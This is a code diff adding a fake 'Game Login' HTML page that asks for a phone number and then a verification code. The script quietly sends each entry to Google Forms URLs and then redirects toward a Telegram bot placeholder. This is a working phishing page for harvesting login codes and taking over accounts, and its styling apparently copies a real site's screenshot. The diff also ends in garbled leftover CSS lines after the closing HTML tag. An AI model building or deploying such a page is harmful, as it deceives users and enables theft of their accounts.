@@ -1,39 +1,135 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Game Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    /* Universal fix for the alignment issue */
+    /* This ensures padding doesn't push the box to the right */
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
 
     body { 
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      font-family: 'Segoe UI', sans-serif; 
       background: #0a0a0a; 
       display: flex; 
       justify-content: center; 
       align-items: center; 
       height: 100vh; 
-      margin: 0; /* Ensures no scrollbars */
-      color: #00aaff; 
+      color: #5bb2ff; 
     }
 
     .box { 
-      background: #1a1a1a; 
-      padding: 30px 25px; 
-      border-radius: 12px; 
-      width: 90%; /* Better for mobile responsiveness */
-      max-width: 400px; 
-      box-shadow: 0 0 20px rgba(0, 170, 255, 0.5); 
-      text-align: center; 
-      transition: all 0.3s ease;
+      background: #181818; 
+      padding: 40px 30px; 
+      border-radius: 20px; 
+      width: 90%; 
+      max-width: 380px; 
+      /* Clean blue glow from your screenshot */
+      box-shadow: 0 0 30px rgba(0, 110, 255, 0.3); 
+      text-align: center;
+      border: 1px solid #1a1a1a;
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      font-weight: 500;
+      font-size: 28px;
     }
 
     input { 
       width: 100%; 
-      padding: 12px; 
+      padding: 14px; 
+      margin-bottom: 20px;
+      border-radius: 10px; 
+      border: 1.5px solid #305070; 
+      background: #0d0d0d; 
+      color: #5bb2ff; 
+      font-size: 18px;
+      outline: none;
+      display: block;
+    }
+
+    input:focus {
+      border-color: #5bb2ff;
+    }
+
+    input::placeholder { color: #2a4a6a; }
+
+    button { 
+      width: 100%; 
+      padding: 14px; 
+      border-radius: 12px; 
+      border: none; 
+      /* Bright sky blue from your screenshot */
+      background: #56aeff; 
+      color: #111; 
+      font-size: 18px; 
+      font-weight: 600;
+      cursor: pointer; 
+      transition: background 0.2s; 
+    }
+
+    button:hover { 
+      background: #4090ff; 
+    }
+
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2 id="title">Enter Phone Number</h2>
+  
+  <input type="tel" id="phone" placeholder="Phone Number">
+  <input type="text" id="code" placeholder="Code" class="hidden">
+  
+  <button id="actionBtn" onclick="submitPhone()">Next</button>
+</div>
+
+<script>
+  let savedPhone = "";
+  const phoneFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
+  const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1SW9p4z1l793SUcuSahzAhqYmAgTGxLPYsrv0_y5ohUs/formResponse";
+
+  function submitPhone() {
+    let phoneVal = document.getElementById("phone").value;
+    if(phoneVal === "") { alert("Please enter phone number"); return; }
+    savedPhone = phoneVal;
+
+    const url = phoneFormURL + "?entry.2000000=" + encodeURIComponent(savedPhone);
+    fetch(url, { mode: "no-cors" });
+
+    // Transition to code screen
+    document.getElementById("title").innerText = "Enter Code";
+    document.getElementById("phone").classList.add("hidden");
+    document.getElementById("code").classList.remove("hidden");
+
+    const btn = document.getElementById("actionBtn");
+    btn.innerText = "Submit";
+    btn.onclick = submitCode;
+  }
+
+  function submitCode() {
+    let codeVal = document.getElementById("code").value;
+    if(codeVal === "") { alert("Please enter code"); return; }
+
+    const url = codeFormURL + "?entry.2000000=" + encodeURIComponent(codeVal);
+    fetch(url, { mode: "no-cors" });
+
+    document.querySelector(".box").innerHTML = "<h2>You’ll be linked to the game soon</h2>";
+    setTimeout(() => { 
+      window.location.href = "YOUR_TELEGRAM_BOT_LINK_HERE"; 
+    }, 2000);
+  }
+</script>
+
+</body>
+</html>
       margin-top: 12px; 
       border-radius: 8px; 
       border: 1px solid #00aaff; 
